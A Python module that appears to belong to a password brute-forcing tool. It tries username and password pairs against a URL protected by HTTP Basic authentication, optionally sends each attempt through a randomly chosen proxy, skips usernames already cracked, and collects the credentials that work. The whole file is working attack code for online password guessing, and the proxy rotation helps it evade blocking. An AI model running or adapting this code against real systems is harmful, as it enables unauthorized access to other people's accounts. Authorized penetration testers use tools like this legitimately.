from libs.mbrowser import mBrowser
from utils.utils import printf, die

# https://stackoverflow.com/a/4089075

def submit(options, loginInfo, creds, result):
	tryPassword, tryUsername = creds
	realm = loginInfo[0]
	for cred in list(result.queue):
		if tryUsername == cred[0]:
			return True # don't run if find password of username
	
	try:
		proc = mBrowser(options.timeout)
		if options.proxy:
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy({"http": proxyAddr})
		proc.httpget_passwd(options.url, tryUsername, tryPassword, realm)
		if options.verbose:
			if options.proxy:
				printf("[+] {%s: %s; %s: %s through %s}" %(loginInfo[1][1], tryUsername, loginInfo[1][0], tryPassword, proxyAddr), 'norm')
			else:
				printf("[+] {%s: %s; %s: %s}" %(loginInfo[1][1], tryUsername, loginInfo[1][0], tryPassword), 'norm')
		proc.open_url(options.url)
		try:
			# Re open URL. If HTTP.code = 200 == success
			proc.open_url(options.url)
			# printf("[*] Page title: ['%s']" %(proc.title()), "good")
			printf("[*] %s [%s]" %([tryUsername, tryPassword], proc.title()), "good")
			result.put([options.url, tryUsername, tryPassword])
			# printf("[*] Match found: %s" %([tryUsername, tryPassword]), "good") 
		except Exception as err:
			try:
				if err.code == 401:
					if options.verbose:
						printf("[-] Failed %s" %(creds[::-1]), "bad")
				else:
					printf("[x] %s: %s" %(err, creds[::-1]), "bad")
			except:
				die("[x] HTTP GET:", err)
	except:
		if options.verbose:
			printf("[x] Failed!", "bad")